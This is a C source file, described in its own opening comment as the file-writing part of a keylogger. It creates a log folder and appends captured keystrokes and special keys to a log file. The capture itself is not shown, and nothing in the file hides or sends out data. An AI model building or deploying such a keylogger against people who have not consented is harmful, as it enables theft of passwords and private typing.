// Basic file writing functions for the keylogger

#include <stdlib.h>
#include <sys/stat.h>
#include "file.h"

#ifdef _WIN32
    #include <direct.h>
    #define mkdir(path, mode) _mkdir(path)  // Windows ignores mode
#elif defined(__linux__)
    #include <unistd.h>
#endif

// Check if the log folder exists
int CheckLogFolder(const char *filePath) {
    struct stat info;

    if (stat(filePath, &info) != 0) {
        perror("Error with stat");
        return 0;
    } else if (info.st_mode & S_IFDIR) {
        return 1;
    } else {
        return 0;
    }
}

// Create the log folder if it doesn't exist
void CreateLogFolder(const char *filePath) {
    if (!CheckLogFolder(filePath)) {
        #ifdef __linux__
            mkdir(filePath, 0777); // Unix
        #elif defined _WIN32
            mkdir(filePath, 0); // Windows
        #elif defined __MACH__
            mkdir(filePath, 0777); // MacOS
        #endif

        // Check if the folder wasn't created successfully
        if (!CheckLogFolder(filePath))
            exit(EXIT_FAILURE);

    } else {
        // Folder already exists, do nothing
    }
}

// Write the captured key into a file
void WriteIntoFile(char data, const char* filePath) {

    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL)
        exit(EXIT_FAILURE);

    char dataStr[2];
    sprintf(dataStr, "%c", data);
    fputs(dataStr, file);
    fflush(file);

    fclose(file);
}

// Write the captured special key into a file
void WriteSpecialKeyIntoFile(char *data, const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL)
        exit(EXIT_FAILURE);

    // Write the special key into the file
    fputs(data, file);
    fflush(file);

    fclose(file);
}